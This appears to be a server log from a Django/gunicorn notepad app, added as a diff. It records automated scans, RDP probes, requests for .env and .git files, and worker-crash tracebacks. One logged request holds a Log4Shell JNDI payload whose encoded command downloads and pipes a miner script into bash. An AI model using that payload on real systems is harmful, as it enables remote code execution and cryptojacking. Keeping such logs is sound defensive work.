+[2025-06-02 12:26:51 +0800] [238475] [WARNING] Invalid request from ip=79.124.49.214: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-02 12:35:32 +0800] [238475] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /developmentserver/metadatauploader
+Not Found: /systembc/password.php
+Not Found: /upl.php
+Not Found: /geoip/
+Not Found: /1.php
+Not Found: /password.php
+Not Found: /form.html
+[2025-06-02 15:00:05 +0800] [238475] [WARNING] Invalid request from ip=31.7.62.234: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-02 15:19:41 +0800] [238475] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /v1/models
+Not Found: /druid/index.html
+[2025-06-02 19:25:08 +0800] [238475] [WARNING] Invalid request from ip=45.142.193.4: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /api/client/update
+Not Found: /pscc/
+Not Found: /start/index.html
+Not Found: /pscc/
+Not Found: /start/index.html
+Not Found: /ping.js
+Not Found: /cgi-bin/luci/;stok=/locale
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /robots.txt
+[2025-06-03 00:21:54 +0800] [238475] [WARNING] Invalid request from ip=45.227.254.156: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /favicon.ico
+Not Found: /443
+[2025-06-03 01:03:28 +0800] [238475] [WARNING] Invalid request from ip=79.124.49.214: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /ips/index.php
+Not Found: /index.php
+Not Found: /ips/index.php
+Not Found: /login/stylesheets/theme.css
+Not Found: /index.php
+Not Found: /chs/js/lang_zh_tw.js
+Not Found: /chs/js/lang_zh_tw.js
+Not Found: /customer/js/lang_zh_tw.js
+Not Found: /index.php
+Not Found: /customer/js/lang_zh_tw.js
+Not Found: /index.php
+Not Found: /stylesheets/theme.css
+Not Found: /public/stylesheets/theme.css
+Not Found: /public/stylesheets/theme.css
+Not Found: /login/stylesheets/theme.css
+Not Found: /stylesheets/theme.css
+[2025-06-03 01:49:03 +0800] [238475] [WARNING] Invalid request from ip=47.236.228.210: Invalid HTTP request line: ''
+Not Found: /favicon.ico
+Not Found: /443
+Not Found: /favicon.ico
+[2025-06-03 03:11:46 +0800] [238475] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-06-03 03:11:46 +0800] [238475] [INFO] Worker exiting (pid: 238475)
+[2025-06-03 03:11:46 +0800] [3846911] [ERROR] Worker (pid:238475) exited with code 255
+[2025-06-03 03:11:46 +0800] [3846911] [ERROR] Worker (pid:238475) exited with code 255.
+[2025-06-03 03:11:46 +0800] [628851] [INFO] Booting worker with pid: 628851
+Not Found: /favicon.ico
+Not Found: /security.txt
+Not Found: /favicon.ico
+Not Found: /index.action
+Not Found: /login.action
+Not Found: /index.do
+Not Found: /index.jsp
+Not Found: /login.do
+Not Found: /login.jsp
+Not Found: /main.jsp
+Not Found: /default.jsp
+Not Found: /register.jsp
+Not Found: /login/login.jsp
+Not Found: /login/indexAction.action
+Not Found: /indexAction.action
+Forbidden (CSRF cookie not set.): /
+Not Found: /index.action
+Not Found: /login.action
+Not Found: /index.do
+Not Found: /index.jsp
+Not Found: /login.do
+Not Found: /login.jsp
+Not Found: /main.jsp
+Not Found: /default.jsp
+Not Found: /register.jsp
+Not Found: /login/login.jsp
+Not Found: /login/indexAction.action
+Not Found: /indexAction.action
+Forbidden (CSRF cookie not set.): /
+Not Found: /index.action
+Not Found: /login.action
+Not Found: /index.do
+Not Found: /index.jsp
+Not Found: /login.do
+Not Found: /login.jsp
+Not Found: /main.jsp
+Not Found: /default.jsp
+Not Found: /register.jsp
+Not Found: /login/login.jsp
+Not Found: /login/indexAction.action
+Not Found: /indexAction.action
+Not Found: /manager/text/list
+Not Found: /upl.php
+Not Found: /t4
+Not Found: /1.php
+Not Found: /systembc/password.php
+Not Found: /password.php
+Not Found: /form.html
+Not Found: /geoip/
+Not Found: /form.html
+Not Found: /upl.php
+Not Found: /t4
+[2025-06-03 08:52:30 +0800] [628851] [WARNING] Invalid request from ip=196.251.71.104: Invalid HTTP request line: 'SSH-2.0-Go'
+[2025-06-03 09:24:00 +0800] [628851] [WARNING] Invalid request from ip=178.159.37.112: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-03 09:35:50 +0800] [628851] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-03 10:10:00 +0800] [628851] [WARNING] Invalid request from ip=79.124.49.214: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-03 10:59:27 +0800] [628851] [WARNING] Invalid request from ip=80.94.95.64: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-03 11:14:30 +0800] [628851] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-03 11:54:16 +0800] [628851] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-03 12:02:47 +0800] [628851] [WARNING] Invalid request from ip=80.94.95.64: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /HNAP1/
+[2025-06-03 13:10:46 +0800] [628851] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-03 13:43:24 +0800] [628851] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /form.html
+Not Found: /upl.php
+Not Found: /geoip/
+Not Found: /password.php
+Not Found: /t4
+Not Found: /1.php
+Not Found: /systembc/password.php
+Not Found: /upl.php
+Not Found: /geoip/
+[2025-06-03 14:27:22 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:628851)
+[2025-06-03 14:27:22 +0800] [628851] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 269, in parse
+    self.get_data(unreader, buf, stop=True)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-03 14:27:22 +0800] [628851] [INFO] Worker exiting (pid: 628851)
+[2025-06-03 14:27:22 +0800] [837125] [INFO] Booting worker with pid: 837125
+Not Found: /developmentserver/metadatauploader
+Not Found: /_profiler/phpinfo
+Not Found: /src/views/user/login.html
+Not Found: /t4
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /form.html
+[2025-06-03 17:21:03 +0800] [837125] [WARNING] Invalid request from ip=45.142.193.72: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-03 18:02:27 +0800] [837125] [WARNING] Invalid request from ip=3.149.59.26: Invalid HTTP request line: 'SSH-2.0-Go'
+Not Found: /.env
+Not Found: /.git/config
+Not Found: /hk1X
+Not Found: /FrWN
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+Not Found: /t4
+Not Found: /1.php
+Not Found: /form.html
+Not Found: /upl.php
+Not Found: /geoip/
+Not Found: /systembc/password.php
+Not Found: /password.php
+Not Found: /aab9
+Not Found: /upl.php
+Not Found: /hk1X
+Not Found: /form.html
+Not Found: /t4
+Not Found: /nacos/
+Not Found: /explicit_not_exist_path
+Not Found: /js/main.js
+Not Found: /nacos/js/main.js
+Not Found: /css/main.css
+Not Found: /nacos/css/main.css
+Not Found: /upl.php
+Not Found: /aab8
+Not Found: /favicon.ico
+Not Found: /FrWN
+Not Found: /hudson
+[2025-06-03 22:38:43 +0800] [837125] [WARNING] Invalid request from ip=194.165.16.162: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-03 22:51:30 +0800] [837125] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-03 23:01:18 +0800] [837125] [WARNING] Invalid request from ip=79.124.49.214: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /favicon.ico
+Not Found: /443
+Not Found: /geoserver
+Not Found: /live-tx.wisetv.com.cn/TJIPTV/TJWSHD2.m3u8
+[2025-06-03 23:41:04 +0800] [837125] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /.env_1
+Not Found: /.env_1
+[2025-06-04 01:23:25 +0800] [837125] [WARNING] Invalid request from ip=39.98.73.159: Invalid HTTP request line: ''
+Not Found: /ping.js
+Not Found: /favicon.ico
+Not Found: /robots.txt
+Not Found: /.well-known/security.txt
+Not Found: /robots.txt
+Not Found: /t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.15.17.128:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC43OC4xNjMvc2NyaXB0cy80dGhlcG9vbF9taW5lci5zaCB8IGJhc2ggLXM7IHdnZXQgLXFPLSBodHRwOi8vNDYuOC43OC4xNjMvc2NyaXB0cy80dGhlcG9vbF9taW5lci5zaCB8IGJhc2ggLXM=}')
+Not Found: /robots.txt
+Not Found: /.well-known/security.txt
+[2025-06-04 05:39:03 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:837125)
+[2025-06-04 05:39:03 +0800] [837125] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-04 05:39:03 +0800] [837125] [INFO] Worker exiting (pid: 837125)
+[2025-06-04 05:39:03 +0800] [1117666] [INFO] Booting worker with pid: 1117666
+[2025-06-04 07:14:04 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1117666)
+[2025-06-04 07:14:04 +0800] [1117666] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-04 07:14:04 +0800] [1117666] [INFO] Worker exiting (pid: 1117666)
+[2025-06-04 07:14:04 +0800] [1146994] [INFO] Booting worker with pid: 1146994
+Not Found: /partymgr/control/main
+Not Found: /v1/models
+Not Found: /.env_sample
+Not Found: /version
+Not Found: /v1
+Not Found: /form.html
+Not Found: /geoip/
+Not Found: /1.php
+Not Found: /systembc/password.php
+Not Found: /password.php
+Not Found: /upl.php
+Not Found: /t4
+Not Found: /robots.txt
+Not Found: /favicon.ico
+[2025-06-04 09:40:54 +0800] [1146994] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-06-04 09:40:54 +0800] [1146994] [INFO] Worker exiting (pid: 1146994)
+[2025-06-04 09:40:54 +0800] [3846911] [ERROR] Worker (pid:1146994) exited with code 255
+[2025-06-04 09:40:54 +0800] [3846911] [ERROR] Worker (pid:1146994) exited with code 255.
+[2025-06-04 09:40:54 +0800] [1192180] [INFO] Booting worker with pid: 1192180
+Not Found: /favicon.ico
+[2025-06-04 09:42:02 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1192180)
+[2025-06-04 09:42:02 +0800] [1192180] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-04 09:42:02 +0800] [1192180] [INFO] Worker exiting (pid: 1192180)
+[2025-06-04 09:42:02 +0800] [1192536] [INFO] Booting worker with pid: 1192536
+Not Found: /sitemap.xml
+Not Found: /ping.js
+Not Found: /l9Kl
+Not Found: /h1sQ
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+Not Found: /geoserver/web/
+Not Found: /api/client/update
+Not Found: /api/client/update
+Not Found: /favicon.ico
+Not Found: /443
+[2025-06-04 15:33:23 +0800] [1192536] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-04 15:44:24 +0800] [1192536] [WARNING] Invalid request from ip=134.209.62.203: Invalid HTTP request line: ''
+[2025-06-04 16:26:10 +0800] [1192536] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-04 17:06:31 +0800] [1192536] [WARNING] Invalid request from ip=45.142.193.132: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-04 18:01:27 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1192536)
+[2025-06-04 18:01:27 +0800] [1192536] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-04 18:01:27 +0800] [1192536] [INFO] Worker exiting (pid: 1192536)
+[2025-06-04 18:01:27 +0800] [1346592] [INFO] Booting worker with pid: 1346592
+Not Found: //
+Not Found: //
+Not Found: //accounts/login/
+Not Found: //accounts/register/
+Not Found: //accounts/register/
+Not Found: //accounts/login/
+Not Found: //friends/
+Not Found: //friends/chat/
+Not Found: //accounts/register/
+Not Found: //
+Not Found: //sharing/public/
+Not Found: //notebooks/
+Not Found: //cgi-bin/readtemplate
+Not Found: //cgi-bin/readtemplate
+Not Found: /index.htm
+Not Found: /index.htm
+Not Found: /index/ddyw.htm
+Not Found: /index/ldsr.htm
+Not Found: /index/kjcx.htm
+Not Found: /index/xsdt.htm
+Not Found: /index/tzgg.htm
+Not Found: /index/zhuantijujia.htm
+Not Found: /index/mtdd.htm
+Not Found: /xxgk.htm
+Not Found: /xxgk.htm
+Not Found: /xxgk/fzzl.htm
+Not Found: /xxgk/lsyg.htm
+Not Found: /xxgk/xrld.htm
+Not Found: /xxgk/lrld.htm
+Not Found: /xxgk/ldtc.htm
+Not Found: /xxgk/xydy.htm
+Not Found: /xxgk/xyfj.htm
+Not Found: /xxgk/xqtj.htm
+Not Found: /xxgk/lxwm.htm
+Not Found: /zzjg1.htm
+Not Found: /zzjg1/jxkyjg.htm
+Not Found: /zzjg1/glfwjg.htm
+Not Found: /jyjx1.htm
+Not Found: /szdw1.htm
+Not Found: /szdw1/zxys.htm
+Not Found: /szdw1/jcrc.htm
+Not Found: /szdw1/jxms.htm
+Not Found: /xkjs1.htm
+Not Found: /xkjs1/zdxk.htm
+Not Found: /xkjs1/bkzysz.htm
+Not Found: /xkjs1/syssxwxk.htm
+Not Found: /xkjs1/sybsxwxk.htm
+Not Found: /xkjs1/sszyxwsqlb.htm
+Not Found: /xkjs1/bszyxwsqlb.htm
+Not Found: /xkjs1/zzszejjcxk.htm
+Not Found: /kxyj1.htm
+Not Found: /kxyj1/gjjkypt.htm
+Not Found: /kxyj1/sbjkypt.htm
+Not Found: /zsjy.htm
+Not Found: /cbgz1.htm
+Not Found: /xyzj1.htm
+Not Found: /index/ddyw.htm
+Not Found: /info/10506/111273.htm
+Not Found: /info/10506/111273.htm
+Not Found: /info/10506/111273.htm
+Not Found: /info/10506/111203.htm
+Not Found: /info/10506/111203.htm
+Not Found: /info/10506/111203.htm
+Not Found: /info/10506/111153.htm
+Not Found: /info/10506/111153.htm
+Not Found: /info/10506/111153.htm
+Not Found: /info/10506/111103.htm
+Not Found: /info/10506/111103.htm
+Not Found: /info/10506/111103.htm
+Not Found: /info/10506/111113.htm
+Not Found: /info/10506/111113.htm
+Not Found: /info/10506/111113.htm
+Not Found: /info/10506/111283.htm
+Not Found: /info/10506/111273.htm
+Not Found: /info/10506/111203.htm
+Not Found: /info/10506/111153.htm
+Not Found: /info/10506/111103.htm
+Not Found: /info/10506/111113.htm
+Not Found: /info/10506/111043.htm
+Not Found: /info/10506/111033.htm
+Not Found: /info/10506/110993.htm
+Not Found: /index/ldsr.htm
+Not Found: /info/10802/111303.htm
+Not Found: /info/10802/111303.htm
+Not Found: /info/10802/111133.htm
+Not Found: /info/10802/111133.htm
+Not Found: /info/10802/111073.htm
+Not Found: /info/10802/111073.htm
+Not Found: /index/kjcx.htm
+Not Found: /info/10801/111313.htm
+Not Found: /info/10801/111223.htm
+Not Found: /info/10801/111093.htm
+Not Found: /info/10801/110953.htm
+Not Found: /info/10801/110923.htm
+Not Found: /info/10801/111313.htm
